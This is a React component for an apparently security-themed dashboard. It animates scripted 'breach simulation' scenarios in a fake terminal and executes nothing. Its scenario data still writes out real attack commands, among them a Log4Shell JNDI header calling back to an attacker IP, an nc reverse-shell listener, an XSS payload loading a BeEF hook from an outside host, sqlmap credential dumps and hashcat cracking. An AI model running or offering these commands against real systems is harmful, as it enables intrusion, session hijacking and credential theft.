import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Cpu, Zap, Activity, Shield, X, ArrowRight, Server, Globe, Lock, Play, RotateCcw, AlertTriangle, Video, Square, Download } from 'lucide-react';
import { useScreenRecorder } from '../hooks/useScreenRecorder';

const BreachSimulator = ({ isOpen, onClose, targetData }) => {
  const [phase, setPhase] = useState('RECON'); 
  const [terminalLines, setTerminalLines] = useState([]);
  const [logs, setLogs] = useState([]);
  const [isSimulating, setIsSimulating] = useState(false);
  const [packets, setPackets] = useState([]);
  const terminalEndRef = useRef(null);

  // Recording Integration
  const { startRecording, stopRecording, isRecording } = useScreenRecorder();

  const getScenario = () => {
    const name = (targetData?.name || '').toLowerCase();
    const owasp = (targetData?.owasp || targetData?.owasp_category || '').toLowerCase();
    
    if (name.includes('sql') || owasp.includes('injection')) return 'SQL_INJECTION';
    if (name.includes('xss') || name.includes('cross-site')) return 'CROSS_SITE_SCRIPTING';
    if (name.includes('access control') || owasp.includes('a01')) return 'BROKEN_ACCESS_CONTROL';
    if (name.includes('crypto') || owasp.includes('a02')) return 'BROKEN_CRYPTOGRAPHY';
    return 'LOG4J'; // Default
  };

  const scenarios = {
    LOG4J: {
        BOOT: {
            command: "hexashield --init --vuln-db=exploit-db",
            output: ["[  0.000000] Linux version 5.15.0-kali7", "[*] Syncing EDB-50592.py intelligence...", "[*] Target: " + (targetData?.target || 'GLOBAL')],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -sV --script http-vuln-cve2021-44228 ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Starting Discovery Scan...", "[+] PORT 8080/tcp OPEN (Apache Log4j)", "[!] VULN CONFIRMED: CVE-2021-44228 (RCE via JNDI)"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "python3 EDB-50592.py --lhost 10.10.14.5 --lport 4444",
            output: ["[*] Crafting JNDI reference payload...", "[*] Source: https://www.exploit-db.com/exploits/50592", "[SUCCESS] Strike package compiled."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: `curl -H 'User-Agent: \$\{jndi:ldap://10.10.14.5:1389/Exploit\}' http://${targetData?.target || 'target'}:8080/`,
            output: ["[*] Injecting payload into HTTP headers...", "[+] JNDI Callback initiated to 10.10.14.5:1389"],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "nc -lvnp 4444 (Listening Link: http://10.10.14.5:4444/rev_shell)",
            output: ["listening on [any] 4444 ...", "[+] Connection from " + (targetData?.target || 'target') + " received!", "[SUCCESS] Shell spawned (uid=0)"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "whoami && ip addr show",
            output: ["root", "inet 172.17.0.2/16", "[!] MISSION ACCOMPLISHED: TARGET SYSTEM COMPROMISED."],
            next: null
        }
    },
    SQL_INJECTION: {
        BOOT: {
            command: "sqlmap --version --update",
            output: ["sqlmap/1.6.2 - automatic SQL injection tool", "[*] Synchronizing EDB-46635 intelligence..."],
            next: 'RECON'
        },
        RECON: {
            command: `sqlmap -u "http://${targetData?.target || '127.0.0.1'}/dashboard/auth.php?id=1" --batch`,
            output: ["[*] Testing 'id' parameter...", "[+] GET parameter 'id' is vulnerable (UNION based).", "[!] Source: https://www.exploit-db.com/exploits/46635"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "sqlmap --dbms=MySQL --level=3 --risk=2 --dbs",
            output: ["[*] Probing schema via boolean-blind...", "[+] [2] databases:", "[-] information_schema", "[-] hexashield_auth"],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "sqlmap -D hexashield_auth --tables --columns",
            output: ["[*] Decoding 'users' column architecture...", "[SUCCESS] Found (id, username, password_hash, role)"],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "sqlmap -D hexashield_auth -T users -C password_hash --dump",
            output: ["[*] Extracting credential blobs...", "[SUCCESS] Data dumped to CSV.", "[+] admin: $2y$10$7f8... (Listening Link: http://10.10.14.5:9090/pwned_creds)"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "cat /tmp/sqlmap_results.csv",
            output: ["admin, b3c4a1782e, SUPERUSER", "[!] MISSION ACCOMPLISHED: SENSITIVE DATA EXFILTRATED."],
            next: null
        }
    },
    CROSS_SITE_SCRIPTING: {
        BOOT: {
            command: "beef-xss --init --vuln-db=edb",
            output: ["[*] Starting BeEF Framework...", "[*] Syncing EDB-44497 (Stored XSS)..."],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p80 --script http-xssed ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Analyzing DOM for injection sinks...", "[!] VULN FOUND: https://www.exploit-db.com/exploits/44497", "[+] Vector identified in 'search_query' field."],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "cat edb_44497_payload.js",
            output: ["[*] Payload: <script src='http://10.10.14.5:3000/hook.js'></script>", "[SUCCESS] Persistence script ready."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: `curl -d "search_query=<script src='http://10.10.14.5:3000/hook.js'></script>" http://${targetData?.target || 'target'}/search`,
            output: ["[*] Delivering persistent hook via POST...", "[+] Victim browser effectively hooked."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "beef-console (Listening Link: http://10.10.14.5:3000/ui/panel)",
            output: ["[*] Waiting for zombie session...", "[SUCCESS] Zombie 1 (IP: " + (targetData?.target || 'target') + ") ACTIVE.", "[+] Capturing auth tokens..."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "beef > zombies 1 execute get_all_cookies",
            output: ["[+] PHPSESSID=7f82b3c4a1d9e2f5...", "[!] MISSION ACCOMPLISHED: BROWSER SESSION HIJACKED."],
            next: null
        }
    },
    BROKEN_ACCESS_CONTROL: {
        BOOT: {
            command: "gobuster dir -u http://" + (targetData?.target || '127.0.0.1'),
            output: ["[*] Starting directory brute-force...", "[*] Using common.txt wordlist"],
            next: 'RECON'
        },
        RECON: {
            command: "gobuster > /admin/ [302 Found]",
            output: ["[*] Testing /admin/ endpoint...", "[!] ACCESS GRANTED: Endpoint /admin/settings bypasses role check."],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "curl -H 'Cookie: role=user' http://target/admin/settings",
            output: ["[*] Probing IDOR vulnerability...", "[+] Parameter 'user_id=1' reveals sensitive config."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "curl -X POST -d 'role=admin' http://target/api/update_user/1",
            output: ["[*] Attempting Privilege Escalation...", "[SUCCESS] User ID 1 role updated to 'ADMIN'"],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "ssh admin@target",
            output: ["[*] Connecting to newly escalated account...", "[SUCCESS] Login successful. Private shell established."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "whoami && cat /root/flag",
            output: ["root", "FLAG{BROKEN_ACCESS_CONTROL_WIN}", "[!] MISSION ACCOMPLISHED: FULL PRIVILEGE ESCALATION."],
            next: null
        }
    },
    BROKEN_CRYPTOGRAPHY: {
        BOOT: {
            command: "sslyze --regular " + (targetData?.target || '127.0.0.1') + ":443",
            output: ["[*] Analyzing SSL/TLS configuration...", "[*] Cipher Suite Analysis started."],
            next: 'RECON'
        },
        RECON: {
            command: "sslyze > TLSv1.0 [VULNERABLE]",
            output: ["[!] Vulnerability: Weak Protocol TLS 1.0 enabled.", "[!] Heartbleed (SSLv3) detected on target."],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            output: ["[*] Cracking MD5 password hashes...", "[*] Dictionary attack in progress..."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "openssl s_client -connect target:443 -tlsv1",
            output: ["[*] Intercepting weak crypto handshake...", "[SUCCESS] Handshake successful using vulnerable cipher."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "hashcat > admin:123456",
            output: ["[*] Recovering plaintext from weak hash...", "[SUCCESS] MD5 Decrypted: b3c4a... -> 'password123'"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "hexashield --verify --crypto",
            output: ["[*] Verifying decrypted credentials...", "[!] MISSION ACCOMPLISHED: CRYPTOGRAPHIC SECRETS DECODED."],
            next: null
        }
    }
  };

  useEffect(() => {
    if (terminalEndRef.current) {
        terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLines]);

  const addLog = (msg, type = 'info') => {
    const time = new Date().toLocaleTimeString([], { hour12: false, minute: '2-digit', second: '2-digit' });
    setLogs(prev => [...prev, { time, msg, type }]);
  };

  const simulatePhase = async (currentPhase) => {
    const activeScenario = getScenario();
    const data = scenarios[activeScenario][currentPhase];
    if (!data) return;

    setPhase(currentPhase);
    addLog(`Initiating ${currentPhase} phase...`, 'process');
    
    // Type out command
    let typed = "";
    for (let i = 0; i < data.command.length; i++) {
        typed += data.command[i];
        setTerminalLines(prev => [...prev.slice(0, -1), `> ${typed}`]);
        if (i === 0) setTerminalLines(prev => [...prev, `> `]);
        await new Promise(r => setTimeout(r, 30));
    }

    // Process output
    for (const out of data.output) {
        await new Promise(r => setTimeout(r, 400));
        setTerminalLines(prev => [...prev, out]);
        
        // Trigger packet visuals for delivery/exploit
        if (currentPhase === 'DELIVERY' || currentPhase === 'EXPLOIT') {
            setPackets(prev => [...prev, { id: Date.now(), direction: 'out' }]);
            setTimeout(() => setPackets(prev => prev.filter(p => p.id !== Date.now())), 1000);
        }
    }

    addLog(`${currentPhase} completed successfully.`, 'success');

    if (data.next) {
        await new Promise(r => setTimeout(r, 1000));
        simulatePhase(data.next);
    } else {
        setIsSimulating(false);
        addLog("Attack simulation finalized.", 'success');
        // Auto-stop recording when mission is accomplished
        if (isRecording) {
            setTimeout(stopRecording, 2000);
        }
    }
  };

  const startSimulation = async (withRecording = false) => {
    if (withRecording) {
        const success = await startRecording();
        if (!success) return; // User cancelled or permission denied
    }

    setTerminalLines([]);
    setLogs([]);
    setIsSimulating(true);
    simulatePhase('BOOT');
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/90 backdrop-blur-xl z-[200]"
          />
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }}
            className="fixed top-[54%] left-[58%] -translate-x-1/2 -translate-y-1/2 w-full max-w-6xl h-[80vh] bg-[#050505] border border-white/10 rounded-[2rem] overflow-hidden z-[201] flex flex-col shadow-[0_0_50px_rgba(0,0,0,1)]"
          >
            {/* Header */}
            <div className="p-6 border-b border-white/5 flex items-center justify-between bg-black/40">
              <div className="flex items-center gap-4">
                <div className="p-3 bg-red-500/10 rounded-2xl border border-red-500/30">
                  <Activity className="text-red-500 animate-pulse" size={20} />
                </div>
                <div>
                  <h3 className="text-xl font-black text-white uppercase tracking-tighter">Live Breach Simulation</h3>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-[0.3em]">Sector: {targetData?.target || 'Operational Node'}</p>
                </div>
              </div>
              <div className="flex items-center gap-6">
                 {!isSimulating && terminalLines.length === 0 && (
                    <div className="flex gap-2">
                       <button 
                          onClick={() => startSimulation(false)}
                          className="flex items-center gap-3 px-6 py-2.5 bg-white/5 border border-white/10 hover:bg-white/10 text-white rounded-xl text-[10px] font-black uppercase tracking-widest transition-all"
                       >
                          <Play size={14} /> Start Operation
                       </button>
                       <button 
                          onClick={() => startSimulation(true)}
                          className="flex items-center gap-3 px-6 py-2.5 bg-red-600 hover:bg-red-700 text-white rounded-xl text-[10px] font-black uppercase tracking-widest transition-all shadow-[0_0_20px_rgba(220,38,38,0.4)]"
                       >
                          <Video size={14} /> Record & Execute
                       </button>
                    </div>
                 )}
                 <button onClick={onClose} className="p-2 hover:bg-white/5 rounded-full text-gray-600 transition-colors">
                    <X size={24} />
                 </button>
              </div>
            </div>

            <div className="flex-1 flex overflow-hidden">
              {/* Center: Animated Terminal (The Master Console) */}
              <div className="flex-1 flex flex-col bg-black/40 terminal-crt relative group">
                {/* Visual Glitch Frame */}
                <div className="absolute inset-0 border border-cyber-blue/10 pointer-events-none group-hover:border-cyber-blue/30 transition-colors duration-700" />
                
                <div className="flex items-center justify-between px-8 py-5 border-b border-white/5 bg-black/60 relative z-20">
                    <div className="flex items-center gap-3">
                        <Terminal size={14} className="text-cyber-blue" />
                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Strike Intelligence Terminal</span>
                    </div>
                    
                    {isRecording && (
                       <div className="flex items-center gap-2 px-4 py-1.5 bg-red-500/10 border border-red-500/30 rounded-full shadow-[0_0_15px_rgba(239,68,68,0.2)]">
                          <div className="w-2 h-2 rounded-full bg-red-600 animate-flicker" />
                          <span className="text-[9px] font-black text-red-500 uppercase tracking-[0.2em]">REC ACTIVE</span>
                       </div>
                    )}

                    <div className="flex items-center gap-4">
                        <div className="flex gap-1.5">
                            <div className="w-2 h-2 rounded-full bg-red-500/30" />
                            <div className="w-2 h-2 rounded-full bg-yellow-500/30" />
                            <div className="w-2 h-2 rounded-full bg-green-500/30" />
                        </div>
                        <span className="text-[10px] font-mono text-cyber-blue/80 font-bold">ROOT@{targetData?.target || 'HEXASHIELD'}:~#</span>
                    </div>
                </div>
                
                <div className="flex-1 p-10 overflow-y-auto font-mono text-[13px] cyber-scrollbar space-y-4 relative z-10 selection:bg-cyber-blue/30">
                   {terminalLines.map((line, i) => (
                     <motion.div 
                        initial={{ opacity: 0, x: -10 }}
                        animate={{ opacity: 1, x: 0 }}
                        key={i} 
                        className={`flex gap-6 ${
                            line.startsWith('>') ? 'text-cyber-blue font-black' : 
                            (line.includes('[SUCCESS]') || line.includes('[+]') || line.includes('READY')) ? 'text-cyber-neon drop-shadow-[0_0_5px_#39FF14]' : 
                            (line.startsWith('[!]') || line.includes('MISSION')) ? 'text-red-500 font-black animate-pulse' : 
                            line.startsWith('[  ') ? 'text-gray-600 italic text-[11px]' : // Kernel logs style
                            'text-white/90'
                        }`}
                     >
                        <span className="opacity-10 shrink-0 w-10 select-none font-bold">{(i + 1).toString().padStart(3, '0')}</span>
                        <span className="break-all tracking-tight leading-relaxed">{line}</span>
                     </motion.div>
                   ))}
                   <div ref={terminalEndRef} />
                </div>

                {/* Packet Relay (Moved further right and down for optimal visibility) */}
                <div className="absolute bottom-6 right-6 w-48 h-64 bg-black/80 border border-white/5 rounded-3xl backdrop-blur-md z-30 p-4 flex flex-col items-center justify-between shadow-2xl">
                    <div className="text-[7px] font-black text-gray-500 uppercase tracking-widest text-center mt-2">Relay Monitor</div>
                    
                    <div className="flex flex-col items-center gap-2">
                        <Cpu size={16} className="text-cyber-blue" />
                        <div className="h-12 w-[1px] bg-white/10 relative">
                             <AnimatePresence>
                                {packets.map(p => (
                                    <motion.div
                                        key={p.id}
                                        initial={{ y: -30, opacity: 0 }}
                                        animate={{ y: 30, opacity: 1 }}
                                        exit={{ opacity: 0 }}
                                        transition={{ duration: 0.8 }}
                                        className="absolute w-1.5 h-1.5 left-[-3px] rounded-full bg-cyber-neon"
                                    />
                                ))}
                             </AnimatePresence>
                        </div>
                        <Server size={16} className="text-red-500" />
                    </div>
                    <div className="text-[7px] font-bold text-cyber-neon mb-2">{isSimulating ? 'TRANSMITTING' : 'IDLE'}</div>
                </div>
              </div>
            </div>

            {/* Tactical Footer / Progress */}
            <div className="p-6 border-t border-white/5 bg-black/60 flex items-center justify-between">
                <div className="flex gap-10">
                    <div className="flex flex-col gap-1">
                       <span className="text-[8px] text-gray-600 font-black uppercase">Operation Phase</span>
                       <span className="text-xs font-black text-white uppercase tracking-widest">{phase}</span>
                    </div>
                    <div className="flex flex-col gap-1">
                       <span className="text-[8px] text-gray-600 font-black uppercase">Traffic Throughput</span>
                       <span className="text-xs font-black text-cyber-neon uppercase tracking-widest">{isSimulating ? '1.2 MB/s' : '0.0 MB/s'}</span>
                    </div>
                </div>
                <div className="flex gap-2">
                   {['RECON', 'WEAPON', 'DELIVERY', 'EXPLOIT', 'IMPACT'].map(p => (
                     <div key={p} className={`w-8 h-1 rounded-full transition-all duration-1000 ${
                        (phase === p) ? 'bg-red-500 shadow-[0_0_10px_#EF4444]' : 
                        scenarios[getScenario()][p].next === null || (Object.keys(scenarios[getScenario()]).indexOf(p) < Object.keys(scenarios[getScenario()]).indexOf(phase)) ? 'bg-cyber-neon' : 'bg-white/5'
                     }`} />
                   ))}
                </div>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
};

export default BreachSimulator;
